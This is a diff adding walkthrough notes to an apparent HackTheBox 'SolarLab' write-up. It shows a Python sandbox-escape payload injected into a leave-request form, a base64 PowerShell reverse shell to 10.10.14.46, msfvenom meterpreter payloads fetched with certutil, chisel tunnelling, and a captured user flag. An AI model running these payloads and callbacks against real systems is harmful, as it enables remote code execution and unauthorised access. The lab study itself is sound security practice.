@@ -198,30 +198,6 @@ Need to shorten the payload??? maximum 300 characters
 
 Read Javascript to know how it validate the input
 ```javascript
-const editor = document.getElementById('editor');
-const userTextInput = document.getElementById('user_input');
-const charCountDisplay = document.getElementById('charCount');
-const maxCharacters = 300;
-
-const toolbarOptions = [
-    ['bold', 'italic', 'underline', 'strike'],
-    ['blockquote', 'code-block'],
-    [{ 'header': 1 }, { 'header': 2 }],
-    [{ 'list': 'ordered' }, { 'list': 'bullet' }],
-    [{ 'indent': '-1' }, { 'indent': '+1' }],
-    [{ 'align': [] }],
-    ['clean']
-];
-
-
-var quill = new Quill('#editor', {
-    theme: 'snow',
-    modules: {
-        toolbar: toolbarOptions,
-    },
-});
-
-
 quill.on('text-change', function () {
     let quillContent = quill.root.innerHTML;
     quillContent = quillContent.replace(/<\/?[^>]+(>|$)/g, ""); // Remove HTML tags
@@ -236,21 +212,185 @@ quill.on('text-change', function () {
     // Update the hidden textarea directly
     userTextInput.value = quillContent;
 });
-
-document.addEventListener('DOMContentLoaded', function () {
-    const form = document.querySelector('form');
-
-    form.addEventListener('submit', function (event) {
-    var fromDate = $("#from").val();
-    var toDate = $("#to").val();
-    var dateRange = fromDate + " to " + toDate;
-    document.getElementById('time_interval').value = dateRange;
-    
-        userTextInput.value = quill.root.innerHTML;
-    });
-});
-
-$( function() {
-    $( "#from, #to" ).datepicker({ dateFormat: 'yy-mm-dd' });
-} );
 ```
+
+Not relevant. This is a server-side check, I cannot do anything here.
+
+My friend informed me that the [exp.py](exp.py) file can be used. First, let check the request body it created.
+
+```
+-----------------------------145785367013355298301179432176
+Content-Disposition: form-data; name="time_interval"
+
+2029-05-26 to 2029-05-27
+-----------------------------145785367013355298301179432176
+Content-Disposition: form-data; name="leave_request"
+
+<p><font color="[ [ getattr(pow, Word(\'__globals__\'))[\'os\'].system(\'test powersell\') for Word in [ orgTypeFun( \'Word\', (str,), { \'mutated\': 1, \'startswith\': lambda self, x: False, \'__eq__\': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, \'mutate\': lambda self: {setattr(self, \'mutated\', self.mutated - 1)}, \'__hash__\': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))]] and \'red\'">
+\n1</font></p>
+\n-----------------------------145785367013355298301179432176
+\nContent-Disposition: form-data; name="signature"; filename="Untitled.png"
+\nContent-Type: image/png
+
+\n\n\x89PNG
+\n\x1a
+\n\x00\x00\x00
+\nIHDR\x00\x00\x00
+\n\x00\x00\x00
+\n\x08\x02\x00\x00\x00\x02PX\xea\x00\x00\x00\x01sRGB\x00\xae\xce\x1c\xe9\x00\x00\x00\x04gAMA\x00\x00\xb1\x8f\x0b\xfca\x05\x00\x00\x00\tpHYs\x00\x00\x0e\xc3\x00\x00\x0e\xc3\x01\xc7o\xa8d\x00\x00\x00)IDAT(Sc\xd8\xbe}\xbb\x80\x80\x00\x03\x03\x03\x07\x07\xc7\xfc\xf9\xf3%$$\x80l\x04@\xe6\x03U@Y#\x1b00\x00\x00\xcb\xed\x04\xf3\x8a;\xa3\x0b\x00\x00\x00\x00IEND\xaeB`\x82
+\n-----------------------------145785367013355298301179432176
+\nContent-Disposition: form-data; name="user_input"
+
+\n\n<p>asdf</p>
+\n-----------------------------145785367013355298301179432176--
+```
+
+The payload was injected to `name="leave_request"`, not in `name="user_input"`. I have tried to add the payload to the `Justification`, which was `user_input`.
+
+Let try again by using burpsuite.
+
+```
+POST /leaveRequest HTTP/1.1
+Host: report.solarlab.htb:6791
+Content-Length: 30792
+Cache-Control: max-age=0
+Accept-Language: en-US
+Upgrade-Insecure-Requests: 1
+Origin: http://report.solarlab.htb:6791
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarys4KbxAIatvCJAW8A
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://report.solarlab.htb:6791/leaveRequest
+Accept-Encoding: gzip, deflate, br
+Cookie: session=.eJwlzjEOwyAMBdC7MHfAGIydy0QYf9SuSTNVvXsjdX_D-6R9HTifaXsfFx5pf0XaEkddIcQtTFqdFuJV2Qa6tRlUPHdk7VagqGQ2x2ApGF6I8hLVXGiaUyUKhU6ApIOXjplvENFQLDvLrEx9sC84yGUFRytq6Y5cJ47_htL3B6oyL3A.ZpOalw.OQz7FD3Fz_xjDdciFW5ZmZxgww4
+Connection: keep-alive
+
+------WebKitFormBoundarys4KbxAIatvCJAW8A
+Content-Disposition: form-data; name="time_interval"
+
+2024-07-01 to 2024-07-25
+------WebKitFormBoundarys4KbxAIatvCJAW8A
+Content-Disposition: form-data; name="leave_request"
+
+1234567890
+------WebKitFormBoundarys4KbxAIatvCJAW8A
+Content-Disposition: form-data; name="signature"; filename="image.png"
+Content-Type: image/png
+
+PNG
+contents of PNG file
+
+------WebKitFormBoundarys4KbxAIatvCJAW8A
+Content-Disposition: form-data; name="user_input"
+
+<p><strong>hello world</strong></p>
+------WebKitFormBoundarys4KbxAIatvCJAW8A--
+```
+
+![alt text](image-10.png)
+
+Not only the Justification. The `Phone number` can be used also. Ah hah.
+
+```html
+<p><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAA2ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">                1234567890</font></p>
+```
+
+Got the rev shell:
+```powershell
+nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.46] from (UNKNOWN) [10.10.11.16] 64468
+
+PS C:\Users\blake\Documents\app>
+PS C:\Users\blake\Desktop> ls
+
+
+    Directory: C:\Users\blake\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         7/14/2024   6:55 AM        9006080 chisel
+-ar---         7/13/2024   6:15 PM             34 user.txt
+
+
+PS C:\Users\blake\Desktop> Get-Content -Path user.txt
+e55ee281a2d619bff8202fd39daba8c9
+```
+
+Got user flag.
+
+Upgrading the revshell to meterpreter shell.
+
+Generate the payload:
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.46 LPORT=4444 -f psh -o meterpreter-4444.ps1
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.46 LPORT=4444 -f exe > shell-x64.exe
+```
+
+First try with ps1 but failed. Retry with exe and success.
+
+
+Setup listener on Kali:
+```bash
+sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.46; set LPORT 4444; exploit"
+```
+
+Create a http server at the directory of payload (kali)
+```bash
+python3 -m http.server 80
+```
+
+On rev powershell:
+```ps
+certutil.exe -urlcache -f http://10.10.14.46:80/shell-x64.exe shell-x64.exe
+```
+
+Execute it on rev powershell:
+```ps
+.\shell-x64.exe
+```
+
+Successfully get a meterpreter shell.
+
+Check open port by `netstat -an` and found `Openfire-service.exe` is running.
+
+Admin Console interface of `Openfire-service`
+
+Port 9090: Used for HTTP access to the Openfire admin console.
+Port 9091: Used for HTTPS (secure HTTP) access to the Openfire admin console.
+
+Search openfire-service exploit and found some CVE, but it requires a port to exploit.
+
+Unfortunately these ports are not open:
+```
+PORT     STATE    SERVICE        VERSION
+9090/tcp filtered zeus-admin
+9091/tcp filtered xmltec-xmlmail
+```
+
+Set up chisel to tunnel this port, first install on Kali linux.
+
+Trying to download the chisel.exe to Windows target. Use `upload` command of meterpreter.
+
+Bypassing firewall:
+
+Connection error with port `8000` on Windows machine. Trying `56928`, failed.
+
+On meterpreter:
+```ps
+execute -f ".\chisel.exe" -a "server --port 56928 --reverse" -i
+
+execute -f ".\chisel.exe" -a "client 10.10.14.46:8000 R:9090:localhost:9090" -i
+```
+
+On kali
+```bash
+chisel client 10.10.11.16:56928 R:9090:localhost:9090
+
+chisel server --port 8000 --reverse
+```
+Connection error with port `8000` on Windows machine. Trying `56928`, failed.
+
+
